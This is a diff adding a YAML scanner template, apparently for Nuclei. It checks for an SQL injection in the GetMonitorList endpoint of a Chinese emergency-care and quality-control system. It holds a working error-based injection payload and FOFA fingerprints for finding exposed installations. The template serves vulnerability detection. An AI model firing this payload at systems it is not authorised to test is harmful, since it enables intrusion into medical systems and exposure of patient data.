@@ -1,0 +1,36 @@
+id: poc-yaml-bian-que-ivtbq-ieqcs-getmonitorlist-sqli
+info:
+  name: 扁鹊飞救智能急救与质控系统 GetMonitorList SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 扁鹊飞救智能急救与质控系统
+    fofa: icon_hash="-757866684" || icon_hash="-1206146847"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(1,1,md5({{t1}})),1)+%26%26%27 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "{{substr(t2, 5, 32)}}"
+          - "XPATH syntax error:"
+          - "&#39;"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
